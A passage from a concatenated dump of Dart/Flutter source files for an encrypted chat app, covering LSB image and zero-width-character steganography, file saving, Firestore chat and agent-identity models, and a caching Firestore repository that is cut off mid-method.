  Future<Uint8List> extractBytesFromImage(Uint8List imageBytes) async {
    // Decode the input image bytes
    img.Image? image = img.decodeImage(imageBytes);
    if (image == null) {
      throw Exception('فشل في فك تشفير الصورة. قد يكون التنسيق غير مدعوم أو الملف تالفًا.');
    }

    int extractedLength = 0;
    int bitCount = 0; // Counter for extracted bits (up to 32 for length)
    List<int> lengthBytes = [0, 0, 0, 0]; // To reconstruct the 4-byte length

    // 1. Extract the 4-byte length prefix (32 bits) from LSBs
    // Iterate through pixels until 32 bits are collected
    for (int y = 0; y < image.height; y++) {
      for (int x = 0; x < image.width; x++) {
        // Stop if 32 bits for length are extracted
        if (bitCount >= 32) break;

        img.Pixel pixel = image.getPixel(x, y);

        // Extract LSB from Red channel
        if (bitCount < 32) {
          int bit = pixel.r.toInt() & 1;
          // Set the corresponding bit in the lengthBytes list
          lengthBytes[bitCount ~/ 8] |= (bit << (7 - (bitCount % 8)));
          bitCount++;
        }
        // Extract LSB from Green channel
        if (bitCount < 32) {
          int bit = pixel.g.toInt() & 1;
          lengthBytes[bitCount ~/ 8] |= (bit << (7 - (bitCount % 8)));
          bitCount++;
        }
        // Extract LSB from Blue channel
        if (bitCount < 32) {
          int bit = pixel.b.toInt() & 1;
          lengthBytes[bitCount ~/ 8] |= (bit << (7 - (bitCount % 8)));
          bitCount++;
        }
      }
      // Stop outer loop if length is extracted
      if (bitCount >= 32) break;
    }

    // Check if enough bits were extracted for the length
    if (bitCount < 32) {
      throw Exception('فشل في استخراج طول البيانات المخفية (الصورة صغيرة جدًا أو تالفة).');
    }

    // Reconstruct the length from the extracted bytes (big-endian)
    extractedLength = ByteData.view(Uint8List.fromList(lengthBytes).buffer).getUint32(0, Endian.big);

    // 2. Sanity check for the extracted length
    // Calculate the maximum possible data length the image could hold
    int maxPossibleLength = (image.width * image.height * 3) ~/ 8 - 4; // Total bits / 8, minus 4 bytes for length
    if (extractedLength <= 0 || extractedLength > maxPossibleLength) {
      throw Exception('تم استخراج طول بيانات غير صالح ($extractedLength). قد تكون الصورة غير حاوية لبيانات مخفية أو تالفة.');
    }

    // 3. Extract the actual data bytes based on the extracted length
    Uint8List extractedData = Uint8List(extractedLength);
    int dataIndex = 0; // Current byte index in extractedData
    int bitIndex = 0; // Current bit index (0-7) within the current byte
    // int pixelCounter = 0; // Removed unused variable
    const int lengthBits = 32; // Number of bits used for the length prefix
    int bitsToSkip = lengthBits;

    // Iterate through pixels again
    for (int y = 0; y < image.height; y++) {
      for (int x = 0; x < image.width; x++) {
        // Stop if all required data bytes are extracted
        if (dataIndex >= extractedLength) break;

        img.Pixel pixel = image.getPixel(x, y);

        // Extract from R channel LSB
        if (bitsToSkip > 0) {
          bitsToSkip--;
        } else if (dataIndex < extractedLength) {
          int bit = pixel.r.toInt() & 1;
          extractedData[dataIndex] |= (bit << (7 - bitIndex));
          bitIndex++;
          if (bitIndex == 8) {
            bitIndex = 0;
            dataIndex++;
          }
        }

        // Extract from G channel LSB
        if (bitsToSkip > 0) {
          bitsToSkip--;
        } else if (dataIndex < extractedLength) {
          int bit = pixel.g.toInt() & 1;
          extractedData[dataIndex] |= (bit << (7 - bitIndex));
          bitIndex++;
          if (bitIndex == 8) {
            bitIndex = 0;
            dataIndex++;
          }
        }

        // Extract from B channel LSB
        if (bitsToSkip > 0) {
          bitsToSkip--;
        } else if (dataIndex < extractedLength) {
          int bit = pixel.b.toInt() & 1;
          extractedData[dataIndex] |= (bit << (7 - bitIndex));
          bitIndex++;
          if (bitIndex == 8) {
            bitIndex = 0;
            dataIndex++;
          }
        }
      }
      // Stop outer loop if data extracted
      if (dataIndex >= extractedLength) break;
    }

    // 4. Final check: Ensure all expected data bytes were extracted
    if (dataIndex < extractedLength) {
       throw Exception('فشل في استكمال استخراج البيانات (تم استخراج $dataIndex بايت فقط من $extractedLength المتوقعة، قد تكون الصورة تالفة).');
    }

    return extractedData;
  }
}




// ------------------------------ نهاية الملف: image_steganography_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: zero_width_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\steganography\zero_width_service.dart
// ----------------------------------------------------------------------

import 'dart:convert';

class ZeroWidthService {
  // Encodes a string into zero-width characters (U+200B and U+200C).
  String encode(String input) {
    if (input.isEmpty) return '';
    final bytes = utf8.encode(input);
    StringBuffer sb = StringBuffer();
    for (var byte in bytes) {
      for (int i = 7; i >= 0; i--) {
        // Use U+200C (ZWNJ) for 1 and U+200B (ZWSP) for 0
        sb.write(((byte >> i) & 1) == 1 ? '\u200C' : '\u200B');
      }
    }
    return sb.toString();
  }

  // Decodes a string containing zero-width characters back to the original string.
  // Returns the decoded string or throws an exception if decoding fails.
  String decode(String input) {
    // Filter only the relevant zero-width characters
    final zeroWidthRunes = input.runes.where((r) => r == 0x200B || r == 0x200C).toList();

    // Check if the number of bits is a multiple of 8
    if (zeroWidthRunes.isEmpty || zeroWidthRunes.length % 8 != 0) {
      throw Exception('No hidden message found or data is corrupted (invalid length).');
    }

    List<int> bytes = [];
    try {
      for (int i = 0; i < zeroWidthRunes.length; i += 8) {
        int currentByte = 0;
        for (int j = 0; j < 8; j++) {
          if (zeroWidthRunes[i + j] == 0x200C) { // 1 is ZWNJ
            currentByte |= (1 << (7 - j));
          }
          // No need for else, ZWSP (0) doesn't change the byte
        }
        bytes.add(currentByte);
      }
      // Attempt to decode the byte list as UTF-8
      return utf8.decode(bytes, allowMalformed: false); // Strict decoding
    } on FormatException catch (e) {
      print('Zero-width decoding error (Format): $e');
      throw Exception('Failed to decode hidden message: Invalid character sequence.');
    } catch (e) {
      print('Zero-width decoding error: $e');
      throw Exception('Failed to decode hidden message: ${e.toString()}');
    }
  }

  // Hides a secret message (already encoded with zero-width chars) within a cover message.
  // Simple strategy: append to the end.
  // More sophisticated strategies could intersperse characters.
  String hideInCoverText(String coverText, String zeroWidthMessage) {
    // Basic implementation: just append the zero-width message
    // Ensure there's maybe a space or ZWSP if cover text doesn't end with one?
    // For now, simple append is likely sufficient as they are invisible.
    return '$coverText$zeroWidthMessage';
  }

  // Extracts the zero-width message potentially hidden in a combined text.
  // This relies on the decode function filtering non-zero-width characters.
  String extractFromText(String combinedText) {
    // The decode function inherently extracts by filtering.
    return decode(combinedText);
  }
}




// ------------------------------ نهاية الملف: zero_width_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: file_saver.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\utils\file_saver.dart
// ----------------------------------------------------------------------

import 'dart:typed_data';
import 'package:flutter/foundation.dart' show kIsWeb;
import 'package:path_provider/path_provider.dart';
import 'package:path/path.dart' as path;
import 'dart:io'; // Only for mobile
// Conditional import for web download functionality
import 'package:universal_html/html.dart' as html show AnchorElement, Blob, Url;

class FileSaver {
  static Future<String> saveFile({
    required Uint8List bytes,
    required String suggestedFileName,
  }) async {
    if (kIsWeb) {
      // Web implementation: Trigger browser download
      try {
        final blob = html.Blob([bytes]);
        final url = html.Url.createObjectUrlFromBlob(blob);
        // The anchor element is created and clicked in one line to avoid unused variable warning.
        html.AnchorElement(href: url)
          ..setAttribute("download", suggestedFileName)
          ..click();
        html.Url.revokeObjectUrl(url);
        return 'تم بدء تنزيل الملف "$suggestedFileName" في المتصفح.';
      } catch (e) {
        print("Web File Save Error: $e");
        throw Exception('فشل حفظ الملف على الويب: ${e.toString()}');
      }
    } else {
      // Mobile implementation: Save to downloads directory
      try {
        final downloadsDir = await getDownloadsDirectory();
        if (downloadsDir == null) {
          throw Exception('لا يمكن الوصول إلى مجلد التنزيلات.');
        }
        final outputPath = path.join(downloadsDir.path, suggestedFileName);
        final outputFile = File(outputPath);
        await outputFile.writeAsBytes(bytes);
        return 'تم حفظ الملف بنجاح في: $outputPath';
      } catch (e) {
        print("Mobile File Save Error: $e");
        throw Exception('فشل حفظ الملف على الجهاز: ${e.toString()}');
      }
    }
  }
}




// ------------------------------ نهاية الملف: file_saver.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: agent_identity.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\data\models\agent\agent_identity.dart
// ----------------------------------------------------------------------

// lib/data/models/agent/agent_identity.dart
import 'package:cloud_firestore/cloud_firestore.dart';

/// نموذج بيانات هوية الوكيل في Firestore
class AgentIdentity {
  final String agentCode;
  final String displayName;
  final String? deviceId;
  final bool deviceBindingRequired;
  final bool needsAdminApprovalForNewDevice;
  final DateTime? lastLoginAt;
  final String? lastLoginDeviceId;
  final bool isActive;
  final Map<String, dynamic>? metadata;

  AgentIdentity({
    required this.agentCode,
    required this.displayName,
    this.deviceId,
    this.deviceBindingRequired = true,
    this.needsAdminApprovalForNewDevice = false,
    this.lastLoginAt,
    this.lastLoginDeviceId,
    this.isActive = true,
    this.metadata,
  });

  /// إنشاء نموذج من بيانات Firestore
  factory AgentIdentity.fromFirestore(DocumentSnapshot<Map<String, dynamic>> doc) {
    final data = doc.data() ?? {};
    
    return AgentIdentity(
      agentCode: doc.id,
      displayName: data['displayName'] as String? ?? doc.id,
      deviceId: data['deviceId'] as String?,
      deviceBindingRequired: data['deviceBindingRequired'] as bool? ?? true,
      needsAdminApprovalForNewDevice: data['needsAdminApprovalForNewDevice'] as bool? ?? false,
      lastLoginAt: (data['lastLoginAt'] as Timestamp?)?.toDate(),
      lastLoginDeviceId: data['lastLoginDeviceId'] as String?,
      isActive: data['isActive'] as bool? ?? true,
      metadata: data['metadata'] as Map<String, dynamic>?,
    );
  }

  /// تحويل النموذج إلى بيانات Firestore
  Map<String, dynamic> toFirestore() {
    return {
      'displayName': displayName,
      'deviceId': deviceId,
      'deviceBindingRequired': deviceBindingRequired,
      'needsAdminApprovalForNewDevice': needsAdminApprovalForNewDevice,
      'lastLoginAt': lastLoginAt != null ? Timestamp.fromDate(lastLoginAt!) : null,
      'lastLoginDeviceId': lastLoginDeviceId,
      'isActive': isActive,
      'metadata': metadata,
    };
  }

  /// إنشاء نسخة معدلة من النموذج
  AgentIdentity copyWith({
    String? displayName,
    String? deviceId,
    bool? deviceBindingRequired,
    bool? needsAdminApprovalForNewDevice,
    DateTime? lastLoginAt,
    String? lastLoginDeviceId,
    bool? isActive,
    Map<String, dynamic>? metadata,
  }) {
    return AgentIdentity(
      agentCode: this.agentCode,
      displayName: displayName ?? this.displayName,
      deviceId: deviceId ?? this.deviceId,
      deviceBindingRequired: deviceBindingRequired ?? this.deviceBindingRequired,
      needsAdminApprovalForNewDevice: needsAdminApprovalForNewDevice ?? this.needsAdminApprovalForNewDevice,
      lastLoginAt: lastLoginAt ?? this.lastLoginAt,
      lastLoginDeviceId: lastLoginDeviceId ?? this.lastLoginDeviceId,
      isActive: isActive ?? this.isActive,
      metadata: metadata ?? this.metadata,
    );
  }
}



// ------------------------------ نهاية الملف: agent_identity.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_conversation.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\data\models\chat\chat_conversation.dart
// ----------------------------------------------------------------------

// lib/data/models/chat/chat_conversation.dart
import 'package:cloud_firestore/cloud_firestore.dart';
import 'dart:math'; // لـ Math.min

class ChatParticipantInfo {
  final String agentCode;
  final String displayName;
  // final String? photoUrl; // يمكنك إضافته لاحقًا إذا أردت صورًا للمستخدمين

  ChatParticipantInfo({
    required this.agentCode,
    required this.displayName,
    // this.photoUrl,
  });

  factory ChatParticipantInfo.fromMap(
      String agentCode, Map<String, dynamic> map) {
    return ChatParticipantInfo(
      agentCode: agentCode,
      displayName: map['displayName'] as String? ?? agentCode,
      // photoUrl: map['photoUrl'] as String?,
    );
  }

  Map<String, dynamic> toMap() {
    return {
      'displayName': displayName,
      // if (photoUrl != null) 'photoUrl': photoUrl,
    };
  }
}

class ChatConversation {
  final String id;
  final List<String> participants;
  final Map<String, ChatParticipantInfo> participantInfo;
  final String conversationTitle;
  final String? lastMessageText;
  final DateTime? lastMessageTimestamp;
  final String? lastMessageSenderAgentCode;
  final DateTime createdAt;
  final DateTime updatedAt;
  final Map<String, bool> deletedForUsers; // Added field

  ChatConversation({
    required this.id,
    required this.participants,
    required this.participantInfo,
    required this.conversationTitle,
    this.lastMessageText,
    this.lastMessageTimestamp,
    this.lastMessageSenderAgentCode,
    required this.createdAt,
    required this.updatedAt,
    required this.deletedForUsers, // Added to constructor
  });

  factory ChatConversation.fromFirestore(
      DocumentSnapshot<Map<String, dynamic>> doc, String currentAgentCode) {
    final data = doc.data();
    if (data == null) {
      throw Exception(
          "ChatConversation document data is null for doc ID: ${doc.id}");
    }

    final participantsList =
        List<String>.from(data['participants'] as List<dynamic>? ?? []);

    Map<String, ChatParticipantInfo> pInfoMap = {};
    if (data['participantInfo'] != null && data['participantInfo'] is Map) {
      (data['participantInfo'] as Map<String, dynamic>).forEach((key, value) {
        if (value is Map<String, dynamic>) {
          pInfoMap[key] = ChatParticipantInfo.fromMap(key, value);
        }
      });
    }

    String determinedConversationTitle;
    if (participantsList.length == 1 &&
        participantsList.contains(currentAgentCode)) {
      determinedConversationTitle = pInfoMap[currentAgentCode]?.displayName ??
          "ملاحظاتي (${currentAgentCode.substring(0, min(3, currentAgentCode.length))}..)";
    } else if (participantsList.length == 2) {
      String? otherAgentCode = participantsList
          .firstWhere((p) => p != currentAgentCode, orElse: () => '');
      if (otherAgentCode.isNotEmpty && pInfoMap.containsKey(otherAgentCode)) {
        determinedConversationTitle = pInfoMap[otherAgentCode]!.displayName;
      } else if (otherAgentCode.isNotEmpty) {
        determinedConversationTitle =
            "العميل ${otherAgentCode.substring(0, min(3, otherAgentCode.length))}..";
      } else {
        determinedConversationTitle = "محادثة خاصة";
      }
    } else if (participantsList.length > 2) {
      if (data['title'] != null && (data['title'] as String).isNotEmpty) {
        determinedConversationTitle = data['title'] as String;
      } else {
        List<String> otherParticipantNames = pInfoMap.entries
            .where((entry) =>
                entry.key != currentAgentCode &&
                entry.value.displayName.isNotEmpty)
            .map((entry) => entry.value.displayName)
            .take(2)
            .toList();
        if (otherParticipantNames.isNotEmpty) {
          determinedConversationTitle =
              "مجموعة: ${otherParticipantNames.join(', ')}";
          if (pInfoMap.length - 1 > 2) {
            determinedConversationTitle += "...";
          }
        } else {
          determinedConversationTitle =
              "مجموعة (${participantsList.length})";
        }
      }
    } else {
      determinedConversationTitle = "محادثة غير معروفة";
    }

    final deletedForUsersData = data['deletedForUsers'] as Map<String, dynamic>? ?? {};
    final Map<String, bool> typedDeletedForUsers = deletedForUsersData.map((key, value) => MapEntry(key, value as bool));

    return ChatConversation(
      id: doc.id,
      participants: participantsList,
      participantInfo: pInfoMap,
      conversationTitle: determinedConversationTitle,
      lastMessageText: data['lastMessageText'] as String?,
      lastMessageTimestamp:
          (data['lastMessageTimestamp'] as Timestamp?)?.toDate(),
      lastMessageSenderAgentCode: data['lastMessageSenderAgentCode'] as String?,
      createdAt: (data['createdAt'] as Timestamp? ?? Timestamp.now()).toDate(),
      updatedAt: (data['updatedAt'] as Timestamp? ?? Timestamp.now()).toDate(),
      deletedForUsers: typedDeletedForUsers, // Use parsed map
    );
  }

  // إضافة طريقة fromMap لإنشاء كائن ChatConversation من Map
  static ChatConversation fromMap(Map<String, dynamic> map) {
    // استخراج معلومات المشاركين
    Map<String, ChatParticipantInfo> pInfoMap = {};
    if (map['participantInfo'] != null && map['participantInfo'] is Map) {
      (map['participantInfo'] as Map<String, dynamic>).forEach((key, value) {
        if (value is Map<String, dynamic>) {
          pInfoMap[key] = ChatParticipantInfo.fromMap(key, value);
        }
      });
    }

    // استخراج قائمة المشاركين
    final participantsList = map['participants'] is List
        ? List<String>.from(map['participants'] as List)
        : <String>[];

    // استخراج معلومات الحذف للمستخدمين
    final deletedForUsersData = map['deletedForUsers'] as Map<String, dynamic>? ?? {};
    final Map<String, bool> typedDeletedForUsers = deletedForUsersData.map((key, value) => MapEntry(key, value as bool));

    return ChatConversation(
      id: map['id'] as String,
      participants: participantsList,
      participantInfo: pInfoMap,
      conversationTitle: map['title'] as String? ?? "محادثة جديدة",
      lastMessageText: map['lastMessage'] as String?,
      lastMessageTimestamp: map['lastMessageTimestamp'] != null
          ? (map['lastMessageTimestamp'] is Timestamp
              ? (map['lastMessageTimestamp'] as Timestamp).toDate()
              : DateTime.parse(map['lastMessageTimestamp'].toString()))
          : null,
      lastMessageSenderAgentCode: map['lastMessageSenderAgentCode'] as String?,
      createdAt: map['createdAt'] != null
          ? (map['createdAt'] is Timestamp
              ? (map['createdAt'] as Timestamp).toDate()
              : DateTime.parse(map['createdAt'].toString()))
          : DateTime.now(),
      updatedAt: map['updatedAt'] != null
          ? (map['updatedAt'] is Timestamp
              ? (map['updatedAt'] as Timestamp).toDate()
              : DateTime.parse(map['updatedAt'].toString()))
          : DateTime.now(),
      deletedForUsers: typedDeletedForUsers,
    );
  }

  Map<String, dynamic> toFirestore() {
    final Map<String, dynamic> dataMap = {
      'participants': participants..sort(),
      'participantInfo':
          participantInfo.map((key, value) => MapEntry(key, value.toMap())),
      'lastMessageText': lastMessageText,
      'lastMessageTimestamp': lastMessageTimestamp != null
          ? Timestamp.fromDate(lastMessageTimestamp!)
          : null,
      'lastMessageSenderAgentCode': lastMessageSenderAgentCode,
      'createdAt': Timestamp.fromDate(createdAt),
      'updatedAt': Timestamp.fromDate(updatedAt),
      'deletedForUsers': deletedForUsers, // Add to Firestore map
    };

    if (participants.length > 2 &&
        conversationTitle != "مجموعة جديدة" &&
        !conversationTitle.startsWith("مجموعة: ")) {
      dataMap['title'] = conversationTitle;
    }
    return dataMap;
  }

  copyWith({required String id}) {}
}



// ------------------------------ نهاية الملف: chat_conversation.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_message.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\data\models\chat\chat_message.dart
// ----------------------------------------------------------------------

// lib/data/models/chat/chat_message.dart
import 'package:cloud_firestore/cloud_firestore.dart';

enum MessageType { text, image, audio, video, file }

String messageTypeToString(MessageType type) {
  return type.toString().split('.').last;
}

MessageType stringToMessageType(String? typeStr) {
  if (typeStr == null) return MessageType.text;
  return MessageType.values.firstWhere(
      (e) =>
          e.toString().split('.').last.toLowerCase() == typeStr.toLowerCase(),
      orElse: () => MessageType.text);
}

class ChatMessage {
  final String id;
  final String senderId; //  agent_code
  final String? text;
  final MessageType messageType;
  final DateTime timestamp;
  final bool isSentByCurrentUser;

  final String? fileName;
  final String? fileUrl;
  final int? fileSize;

  ChatMessage({
    required this.id,
    required this.senderId,
    this.text,
    required this.messageType,
    required this.timestamp,
    required this.isSentByCurrentUser,
    this.fileName,
    this.fileUrl,
    this.fileSize,
  });

  factory ChatMessage.fromFirestore(
      DocumentSnapshot<Map<String, dynamic>> doc, String currentAgentCode) {
    final data = doc.data();
    if (data == null) {
      // يمكنك رمي استثناء أو إرجاع قيمة افتراضية إذا كان المستند فارغًا بشكل غير متوقع
      throw Exception(
          "ChatMessage document data is null for doc ID: ${doc.id}");
    }
    final senderAgentCode = data['senderAgentCode'] as String? ?? '';
    return ChatMessage(
      id: doc.id,
      senderId: senderAgentCode,
      text: data['text'] as String?,
      messageType: stringToMessageType(data['messageType'] as String?),
      timestamp: (data['timestamp'] as Timestamp? ?? Timestamp.now())
          .toDate(), // استخدام Timestamp من Firestore
      isSentByCurrentUser: senderAgentCode == currentAgentCode,
      fileName: data['fileName'] as String?,
      fileUrl: data['fileUrl'] as String?,
      fileSize: data['fileSize'] as int?,
    );
  }

  Map<String, dynamic> toFirestore() {
    return {
      'senderAgentCode': senderId,
      if (text != null && text!.isNotEmpty) 'text': text,
      'messageType': messageTypeToString(messageType),
      // سيتم تعيين timestamp كـ FieldValue.serverTimestamp() في ApiService
      // أو يمكنك استخدام Timestamp.fromDate(timestamp) إذا كنت تريد وقت العميل
      'timestamp':
          Timestamp.fromDate(timestamp), // أو اتركه ليتم تعيينه في ApiService
      if (fileName != null) 'fileName': fileName,
      if (fileUrl != null) 'fileUrl': fileUrl,
      if (fileSize != null) 'fileSize': fileSize,
    };
  }

  copyWith({required String id}) {}
}



// ------------------------------ نهاية الملف: chat_message.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: firestore_repository.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\data\repositories\firestore_repository.dart
// ----------------------------------------------------------------------

// lib/data/repositories/firestore_repository.dart
import 'dart:async';
import 'dart:nativewrappers/_internal/vm/lib/math_patch.dart';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/foundation.dart';

import '../../core/logging/logger_service.dart';
import '../models/chat/chat_conversation.dart';
import '../models/chat/chat_message.dart';

/// تنفيذ نمط Repository لعزل منطق التعامل مع Firestore وتوفير طبقة تخزين مؤقت
class FirestoreRepository {
  final FirebaseFirestore _firestore;
  final FirebaseStorage _storage;
  final LoggerService _logger;
  final String _currentAgentCode;

  // تخزين مؤقت للمحادثات
  final Map<String, ChatConversation> _conversationsCache = {};

  // تخزين مؤقت للرسائل مع مفتاح مركب من معرف المحادثة
  final Map<String, List<ChatMessage>> _messagesCache = {};

  // تخزين مؤقت لمعلومات المستخدمين
  final Map<String, ChatParticipantInfo> _participantInfoCache = {};

  // تخزين مؤقت لنتائج التحقق من رموز العملاء
  final Map<String, bool> _agentCodeValidationCache = {};

  // مؤقتات لإعادة تحميل البيانات
  final Map<String, Timer> _cacheExpiryTimers = {};

  // مدة صلاحية التخزين المؤقت
  static const Duration _cacheDuration = Duration(minutes: 15);
  static const Duration _participantInfoCacheDuration = Duration(hours: 1);

  // حد أقصى لعدد الرسائل في الصفحة الواحدة
  static const int _defaultPageSize = 20;

  // تدفقات البيانات المباشرة
  final Map<String, StreamController<List<ChatConversation>>>
  _conversationStreamControllers = {};
  final Map<String, StreamController<List<ChatMessage>>>
  _messageStreamControllers = {};

  FirestoreRepository(
    this._firestore,
    this._storage,
    this._logger,
    this._currentAgentCode,
  ) {
    if (_currentAgentCode.isEmpty) {
      _logger.error(
        "FirestoreRepository:Constructor",
        "CRITICAL: Repository initialized with an empty agent code!",
      );
    }
    _logger.info(
      "FirestoreRepository:Constructor",
      "Repository initialized for agent: $_currentAgentCode",
    );
  }

  /// الحصول على تدفق المحادثات مع التخزين المؤقت
  Stream<List<ChatConversation>> getConversationsStream() {
    final String cacheKey = 'conversations_$_currentAgentCode';

    // إنشاء وحدة تحكم بالتدفق إذا لم تكن موجودة
    _conversationStreamControllers[cacheKey] ??=
        StreamController<List<ChatConversation>>.broadcast(
          onListen: () {
            _logger.debug(
              "FirestoreRepository:getConversationsStream",
              "First listener attached, starting Firestore stream",
            );
            _startConversationsFirestoreStream(cacheKey);
          },
          onCancel: () {
            _logger.debug(
              "FirestoreRepository:getConversationsStream",
              "Last listener detached, considering cleanup",
            );
            // تنظيف بعد تأخير للسماح بإعادة الاستماع السريعة
            Future.delayed(const Duration(minutes: 5), () {
              if (_conversationStreamControllers[cacheKey]?.hasListener ==
                  false) {
                _logger.debug(
                  "FirestoreRepository:getConversationsStream",
                  "No listeners after delay, cleaning up",
                );
                _conversationStreamControllers[cacheKey]?.close();
                _conversationStreamControllers.remove(cacheKey);
              }
            });
          },
        );

    // إرسال البيانات المخزنة مؤقتًا فورًا إذا كانت متوفرة
    if (_conversationsCache.isNotEmpty) {
      final cachedConversations =
          _conversationsCache.values.toList()
            ..sort((a, b) => b.updatedAt.compareTo(a.updatedAt));
      _conversationStreamControllers[cacheKey]?.add(cachedConversations);
    }

    return _conversationStreamControllers[cacheKey]!.stream;
  }

  /// بدء تدفق Firestore للمحادثات
  void _startConversationsFirestoreStream(String cacheKey) {
    _firestore
        .collection("conversations")
        .where("participants", arrayContains: _currentAgentCode)
        .where("deletedForUsers.$_currentAgentCode", isNotEqualTo: true)
        .orderBy("updatedAt", descending: true)
        .snapshots()
        .listen(
          (snapshot) {
            _logger.debug(
              "FirestoreRepository:_startConversationsFirestoreStream",
              "Received ${snapshot.docs.length} conversations from Firestore",
            );

            // تحديث التخزين المؤقت
            for (final doc in snapshot.docs) {
              final conversation = ChatConversation.fromFirestore(
                doc as DocumentSnapshot<Map<String, dynamic>>,
                _currentAgentCode,
              );
              _conversationsCache[conversation.id] = conversation;
            }

            // إرسال البيانات المحدثة للمستمعين
            final conversations =
                _conversationsCache.values.toList()
                  ..sort((a, b) => b.updatedAt.compareTo(a.updatedAt));

            _conversationStreamControllers[cacheKey]?.add(conversations);

            // تعيين مؤقت لانتهاء صلاحية التخزين المؤقت
            _resetCacheExpiryTimer(cacheKey, _cacheDuration);
          },
          onError: (error, stackTrace) {
            _logger.error(
              "FirestoreRepository:_startConversationsFirestoreStream",
              "Error in Firestore stream",
              error,
              stackTrace,
            );
            _conversationStreamControllers[cacheKey]?.addError(
              error,
              stackTrace,
            );
          },
        );
  }

  /// الحصول على تدفق الرسائل مع التخزين المؤقت والتحميل الكسول
  Stream<List<ChatMessage>> getMessagesStream(
    String conversationId, {
    int pageSize = _defaultPageSize,
  }) {
    if (conversationId.isEmpty) {
      _logger.warn(
        "FirestoreRepository:getMessagesStream",
        "Empty conversation ID provided",
      );
      return Stream.value([]);
    }

    final String cacheKey = 'messages_${conversationId}_$_currentAgentCode';

    // إنشاء وحدة تحكم بالتدفق إذا لم تكن موجودة
    _messageStreamControllers[cacheKey] ??= StreamController<
      List<ChatMessage>
    >.broadcast(
      onListen: () {
        _logger.debug(
          "FirestoreRepository:getMessagesStream",
          "First listener attached for conversation $conversationId, starting Firestore stream",
        );
        _startMessagesFirestoreStream(conversationId, cacheKey, pageSize);
      },
      onCancel: () {
        _logger.debug(
          "FirestoreRepository:getMessagesStream",
          "Last listener detached for conversation $conversationId, considering cleanup",
        );
        // تنظيف بعد تأخير للسماح بإعادة الاستماع السريعة
        Future.delayed(const Duration(minutes: 5), () {
          if (_messageStreamControllers[cacheKey]?.hasListener == false) {
            _logger.debug(
              "FirestoreRepository:getMessagesStream",
              "No listeners after delay for conversation $conversationId, cleaning up",
            );
            _messageStreamControllers[cacheKey]?.close();
            _messageStreamControllers.remove(cacheKey);
          }
        });
      },
    );

    // إرسال البيانات المخزنة مؤقتًا فورًا إذا كانت متوفرة
    if (_messagesCache.containsKey(conversationId)) {
      _messageStreamControllers[cacheKey]?.add(
        List.unmodifiable(_messagesCache[conversationId]!),
      );
    }

    return _messageStreamControllers[cacheKey]!.stream;
  }

  /// بدء تدفق Firestore للرسائل مع التحميل الكسول
  void _startMessagesFirestoreStream(
    String conversationId,
    String cacheKey,
    int pageSize,
  ) {
    // استخدام التحميل الكسول (Lazy Loading) مع Pagination
    _firestore
        .collection("conversations")
        .doc(conversationId)
        .collection("messages")
        .orderBy(
          "timestamp",
          descending: true,
        ) // ترتيب تنازلي للحصول على أحدث الرسائل أولاً
        .limit(pageSize)
        .snapshots()
        .listen(
          (snapshot) {
            _logger.debug(
              "FirestoreRepository:_startMessagesFirestoreStream",
              "Received ${snapshot.docs.length} messages from Firestore for conversation $conversationId",
            );

            // تحويل المستندات إلى رسائل
            final messages =
                snapshot.docs
                    .map(
                      (doc) => ChatMessage.fromFirestore(
                        doc as DocumentSnapshot<Map<String, dynamic>>,
                        _currentAgentCode,
                      ),
                    )
                    .toList();

            // ترتيب الرسائل تصاعديًا حسب الوقت (الأقدم أولاً)
            messages.sort((a, b) => a.timestamp.compareTo(b.timestamp));

            // تحديث التخزين المؤقت
            _messagesCache[conversationId] = messages;

            // إرسال البيانات المحدثة للمستمعين
            _messageStreamControllers[cacheKey]?.add(
              List.unmodifiable(messages),
            );

            // تعيين مؤقت لانتهاء صلاحية التخزين المؤقت
            _resetCacheExpiryTimer('messages_$conversationId', _cacheDuration);
          },
          onError: (error, stackTrace) {
            _logger.error(
              "FirestoreRepository:_startMessagesFirestoreStream",
              "Error in Firestore stream for conversation $conversationId",
              error,
              stackTrace,
            );
            _messageStreamControllers[cacheKey]?.addError(error, stackTrace);
          },
        );
  }

  /// تحميل المزيد من الرسائل (صفحة إضافية)
  Future<List<ChatMessage>> loadMoreMessages(
    String conversationId,
    DateTime beforeTimestamp, {
    int pageSize = _defaultPageSize,
  }) async {
    if (conversationId.isEmpty) {
      _logger.warn(
        "FirestoreRepository:loadMoreMessages",
        "Empty conversation ID provided",
      );
      return [];
    }

    try {
      final snapshot =
          await _firestore
              .collection("conversations")
              .doc(conversationId)
              .collection("messages")
              .orderBy("timestamp", descending: true)
              .where("timestamp", isLessThan: beforeTimestamp)
              .limit(pageSize)
              .get();

      _logger.debug(
        "FirestoreRepository:loadMoreMessages",
        "Loaded ${snapshot.docs.length} more messages for conversation $conversationId",
      );

      // تحويل المستندات إلى رسائل
      final newMessages =
          snapshot.docs
              .map(
                (doc) => ChatMessage.fromFirestore(
                  doc as DocumentSnapshot<Map<String, dynamic>>,
                  _currentAgentCode,
                ),
              )
              .toList();

      // ترتيب الرسائل تصاعديًا حسب الوقت (الأقدم أولاً)
      newMessages.sort((a, b) => a.timestamp.compareTo(b.timestamp));

      // دمج الرسائل الجديدة مع الرسائل المخزنة مؤقتًا
      if (_messagesCache.containsKey(conversationId)) {
        final allMessages = [
          ..._messagesCache[conversationId]!,
          ...newMessages,
        ];
        // إزالة التكرارات (إذا وجدت)
        final uniqueMessages = <String, ChatMessage>{};
        for (final message in allMessages) {
          uniqueMessages[message.id] = message;
        }

        // ترتيب الرسائل تصاعديًا حسب الوقت
        final sortedMessages =
            uniqueMessages.values.toList()
              ..sort((a, b) => a.timestamp.compareTo(b.timestamp));

        // تحديث التخزين المؤقت
        _messagesCache[conversationId] = sortedMessages;

